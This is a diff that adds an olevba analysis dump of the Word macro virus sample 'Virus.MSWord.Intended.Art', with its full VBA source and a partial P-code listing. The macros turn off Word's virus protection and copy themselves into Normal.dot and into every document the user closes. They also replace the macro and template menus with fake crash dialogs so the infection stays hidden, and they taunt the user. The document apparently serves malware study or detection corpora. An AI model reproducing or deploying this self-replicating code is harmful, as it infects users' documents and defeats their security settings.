@@ -1,0 +1,1761 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Intended.Art
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Intended.Art - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO WordArtv.bas 
+in file: Virus.MSWord.Intended.Art - OLE stream: 'Macros/VBA/WordArtv'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoClose()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorAC
+iMacroCount = WordBasic.CountMacros(0, 0)
+For i = 1 To iMacroCount
+    If WordBasic.[MacroName$](i, 0) = "WordArtV" Then
+        bInstalled = -1
+    End If
+Next i
+If Not bInstalled Then
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WordArtV", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
+    StatusBar = "Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+    For i = 1 To 400000
+    Next i
+Else
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WordArtV", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
+End If
+ErrorAC:
+Dim Valeur, Taille, Choix
+Randomize
+Valeur = Int(Rnd * 10) + 1
+Taille = Int(Rnd * 100) + 20
+Choix = Int(Rnd * 10) + 1
+L$ = Int(Rnd * 250) + 1
+T$ = Int(Rnd + 350) + 1
+If Valeur = 1 Then
+    a$ = msoTextEffect26
+End If
+If Valeur = 2 Then
+    a = msoTextEffect13
+End If
+If Valeur = 3 Then
+    a$ = msoTextEffect19
+End If
+If Valeur = 4 Then
+    a$ = msoTextEffect8
+End If
+If Valeur = 5 Then
+    a$ = msoTextEffect5
+End If
+If Valeur = 6 Then
+    a$ = msoTextEffect16
+End If
+If Valeur = 7 Then
+    a$ = msoTextEffect26
+End If
+If Valeur = 8 Then
+    a$ = msoTextEffect2
+End If
+If Valeur = 9 Then
+    a$ = msoTextEffect19
+End If
+If Valeur = 10 Then
+    a$ = msoTextEffect29
+End If
+If (Choix = 1) Or (Choix = 3) Or (Choix = 5) Then
+ActiveDocument.Shapes.AddTextEffect PresetTextEffect:=a$, Text:="ZeMacroKiller98", FontName:="Impact", FontSize:=Taille, FontBold:=msoFalse, FontItalic:=msoFalse, Left:=L$, Top:=T$
+MsgBox "ZeMacroKiller98 est avec vous...", vbExclamation, "WordArtV"
+End If
+If (Choix = 2) Or (Choix = 4) Or (Choix = 6) Then
+ActiveDocument.Shapes.AddTextEffect PresetTextEffect:=a$, Text:="ZeMacroKiller98", FontName:="Impact", FontSize:=Taille, FontBold:=msoFalse, FontItalic:=msoFalse, Left:=L$, Top:=T$
+MsgBox "WordArtV vous a contaminé...", vbExclamation, "ZeMacroKiller98"
+End If
+If (Choix = 1) Or (Choix = 3) Or (Choix = 5) Then
+MsgBox "ZeMacroKiller98 et WordArtV vous remercie...", vbInformation, "HAHAHAHAHA!"
+End If
+ActiveDocument.Save
+End Sub
+Sub FileSaveAs()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFSA
+    Dialogs(wdDialogFileSaveAs).Show
+    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
+        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
+    End If
+ErrorFSA:
+End Sub
+Sub FileTemplates()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFT
+    UserForm900.Show
+ErrorFT:
+End Sub
+Sub ToolsMacro()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorTM
+    UserForm999.Show
+ErrorTM:
+End Sub
+Sub ViewVBCode()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorVVBC
+    MsgBox "Ce programme a réalisé une opérartion illégale et va être interrompu.", vbCritical, "Microsoft Word"
+ErrorVVBC:
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO UserForm900.frm 
+in file: Virus.MSWord.Intended.Art - OLE stream: 'Macros/VBA/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+
+
+Private Sub CommandButton1_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton2_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton3_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton4_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton5_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton6_Click()
+Unload UserForm900
+End Sub
+
+Private Sub UserForm_Initialize()
+    TextBox1.Text = NormalTemplate.Name
+    CommandButton2.Enabled = False
+    CommandButton3.Enabled = False
+    CommandButton4.Enabled = False
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO UserForm999.frm 
+in file: Virus.MSWord.Intended.Art - OLE stream: 'Macros/VBA/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+
+
+
+
+
+
+Private Sub ListBox1_Click()
+    If ListBox1.Selected(0) = True Then
+        CommandButton1.Enabled = True
+        CommandButton3.Enabled = True
+        CommandButton4.Enabled = True
+        CommandButton6.Enabled = True
+    ElseIf ListBox1.Selected(1) = True Then
+        CommandButton1.Enabled = True
+        CommandButton3.Enabled = True
+        CommandButton4.Enabled = True
+        CommandButton6.Enabled = True
+    Else
+        CommandButton1.Enabled = False
+        CommandButton3.Enabled = False
+        CommandButton4.Enabled = False
+        CommandButton6.Enabled = False
+    End If
+End Sub
+
+Private Sub UserForm_Initialize()
+    ComboBox1.AddItem "Commande Word"
+    ComboBox1.AddItem "Tous les modèles actifs"
+    ComboBox1.AddItem "Normal.dot (modèle global)"
+    ComboBox1.AddItem WordBasic.WindowName$()
+    CommandButton1.Enabled = False
+    CommandButton3.Enabled = False
+    TextBox2.Text = "Macro créée le " & Date & " par " & Application.UserName
+End Sub
+
+Private Sub CommandButton1_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+Private Sub CommandButton2_Click()
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton3_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton4_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton5_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton6_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton7_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+Private Sub ScrollBar1_Change()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: Virus.MSWord.Intended.Art
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 965 bytes
+' Macros/VBA/WordArtv - 12129 bytes
+' Line #0:
+' 	FuncDefn (Sub AutoClose())
+' Line #1:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #2:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #3:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #4:
+' 	OnError ErrorAC 
+' Line #5:
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd CountMacros 0x0002 
+' 	St iMacroCount 
+' Line #6:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld iMacroCount 
+' 	For 
+' Line #7:
+' 	Ld i 
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd [MacroName$] 0x0002 
+' 	LitStr 0x0008 "WordArtV"
+' 	Eq 
+' 	IfBlock 
+' Line #8:
+' 	LitDI2 0x0001 
+' 	UMi 
+' 	St bInstalled 
+' Line #9:
+' 	EndIfBlock 
+' Line #10:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #11:
+' 	Ld bInstalled 
+' 	Not 
+' 	IfBlock 
+' Line #12:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x0008 "WordArtV"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #13:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm900"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #14:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm999"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #15:
+' 	LitStr 0x0049 "Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #16:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #17:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #18:
+' 	LitStr 0x0050 "       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #19:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #20:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #21:
+' 	LitStr 0x0058 "               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #22:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #23:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #24:
+' 	LitStr 0x0060 "                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #25:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #26:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #27:
+' 	LitStr 0x0068 "                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #28:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #29:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #30:
+' 	LitStr 0x0070 "                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #31:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #32:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #33:
+' 	LitStr 0x0078 "                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #34:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #35:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #36:
+' 	LitStr 0x0080 "                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #37:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #38:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #39:
+' 	LitStr 0x0088 "                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #40:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #41:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #42:
+' 	LitStr 0x0090 "                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #43:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #44:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #45:
+' 	LitStr 0x0098 "                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #46:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #47:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #48:
+' 	LitStr 0x00A0 "                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #49:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #50:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #51:
+' 	LitStr 0x00A8 "                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #52:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #53:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #54:
+' 	LitStr 0x00B0 "                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #55:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #56:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #57:
+' 	LitStr 0x00B8 "                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #58:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #59:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #60:
+' 	LitStr 0x00C0 "                                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #61:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #62:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #63:
+' 	LitStr 0x00C8 "                                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #64:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #65:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #66:
+' 	LitStr 0x00D0 "                                                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #67:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #68:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #69:
+' 	LitStr 0x00D8 "                                                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
+' 	St StatusBar 
+' Line #70:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #71:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #72:
+' 	ElseBlock 
+' Line #73:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x0008 "WordArtV"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #74:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm900"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #75:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm999"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #76:
+' 	EndIfBlock 
+' Line #77:
+' 	Label ErrorAC 
+' Line #78:
+' 	Dim 
+' 	VarDefn Valeur
+' 	VarDefn Taille
+' 	VarDefn Choix
+' Line #79:
+' 	ArgsCall Read 0x0000 
+' Line #80:
+' 	Ld Rnd 
+' 	LitDI2 0x000A 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St Valeur 
+' Line #81:
+' 	Ld Rnd 
+' 	LitDI2 0x0064 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0014 
+' 	Add 
+' 	St Taille 
+' Line #82:
+' 	Ld Rnd 
+' 	LitDI2 0x000A 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St Choix 
+' Line #83:
+' 	Ld Rnd 
+' 	LitDI2 0x00FA 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St L$ 
+' Line #84:
+' 	Ld Rnd 
+' 	LitDI2 0x015E 
+' 	Add 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St T$ 
+' Line #85:
+' 	Ld Valeur 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #86:
+' 	Ld msoTextEffect26 
+' 	St a$ 
+' Line #87:
+' 	EndIfBlock 
+' Line #88:
+' 	Ld Valeur 
+' 	LitDI2 0x0002 
+' 	Eq 
+' 	IfBlock 
+' Line #89:
+' 	Ld msoTextEffect13 
+' 	St a 
+' Line #90:
+' 	EndIfBlock 
+' Line #91:
+' 	Ld Valeur 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	IfBlock 
+' Line #92:
+' 	Ld msoTextEffect19 
+' 	St a$ 
+' Line #93:
+' 	EndIfBlock 
+' Line #94:
+' 	Ld Valeur 
+' 	LitDI2 0x0004 
+' 	Eq 
+' 	IfBlock 
+' Line #95:
+' 	Ld msoTextEffect8 
+' 	St a$ 
+' Line #96:
+' 	EndIfBlock 
+' Line #97:
+' 	Ld Valeur 
+' 	LitDI2 0x0005 
+' 	Eq 
+' 	IfBlock 
+' Line #98:
+' 	Ld msoTextEffect5 
+' 	St a$ 
+' Line #99:
+' 	EndIfBlock 
+' Line #100:
+' 	Ld Valeur 
+' 	LitDI2 0x0006 
+' 	Eq 
+' 	IfBlock 
+' Line #101:
+' 	Ld msoTextEffect16 
+' 	St a$ 
+' Line #102:
+' 	EndIfBlock 
+' Line #103:
+' 	Ld Valeur 
+' 	LitDI2 0x0007 
+' 	Eq 
+' 	IfBlock 
+' Line #104:
+' 	Ld msoTextEffect26 
+' 	St a$ 
+' Line #105:
+' 	EndIfBlock 
+' Line #106:
+' 	Ld Valeur 
+' 	LitDI2 0x0008 
+' 	Eq 
+' 	IfBlock 
+' Line #107:
+' 	Ld msoTextEffect2 
+' 	St a$ 
+' Line #108:
+' 	EndIfBlock 
+' Line #109:
+' 	Ld Valeur 
+' 	LitDI2 0x0009 
+' 	Eq 
+' 	IfBlock 
+' Line #110:
+' 	Ld msoTextEffect19 
+' 	St a$ 
+' Line #111:
+' 	EndIfBlock 
+' Line #112:
+' 	Ld Valeur 
+' 	LitDI2 0x000A 
+' 	Eq 
+' 	IfBlock 
+' Line #113:
+' 	Ld msoTextEffect29 
+' 	St a$ 
+' Line #114:
+' 	EndIfBlock 
+' Line #115:
+' 	Ld Choix 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	Paren 
+' 	Ld Choix 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld Choix 
+' 	LitDI2 0x0005 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #116:
+' 	Ld a$ 
+' 	ParamNamed PresetTextEffect 
+' 	LitStr 0x000F "ZeMacroKiller98"
+' 	ParamNamed Then 
+' 	LitStr 0x0006 "Impact"
+' 	ParamNamed FontName 
+' 	Ld Taille 
+' 	ParamNamed FontSize 
+' 	Ld msoFalse 
+' 	ParamNamed FontBold 
+' 	Ld msoFalse 
+' 	ParamNamed FontItalic 
+' 	Ld L$ 
+' 	ParamNamed LBound 
+' 	Ld T$ 
+' 	ParamNamed Top 
+' 	Ld ActiveDocument 
+' 	MemLd Shapes 
+' 	ArgsMemCall AddTextEffect 0x0008 
+' Line #117:
+' 	LitStr 0x0020 "ZeMacroKiller98 est avec vous..."
+' 	Ld vbExclamation 
+' 	LitStr 0x0008 "WordArtV"
+' 	ArgsCall MsgBox 0x0003 
+' Line #118:
+' 	EndIfBlock 
+' Line #119:
+' 	Ld Choix 
+' 	LitDI2 0x0002 
+' 	Eq 
+' 	Paren 
+' 	Ld Choix 
+' 	LitDI2 0x0004 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld Choix 
+' 	LitDI2 0x0006 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #120:
+' 	Ld a$ 
+' 	ParamNamed PresetTextEffect 
+' 	LitStr 0x000F "ZeMacroKiller98"
+' 	ParamNamed Then 
+' 	LitStr 0x0006 "Impact"
+' 	ParamNamed FontName 
+' 	Ld Taille 
+' 	ParamNamed FontSize 
+' 	Ld msoFalse 
+' 	ParamNamed FontBold 
+' 	Ld msoFalse 
+' 	ParamNamed FontItalic 
+' 	Ld L$ 
+' 	ParamNamed LBound 
+' 	Ld T$ 
+' 	ParamNamed Top 
+' 	Ld ActiveDocument 
+' 	MemLd Shapes 
+' 	ArgsMemCall AddTextEffect 0x0008 
+' Line #121:
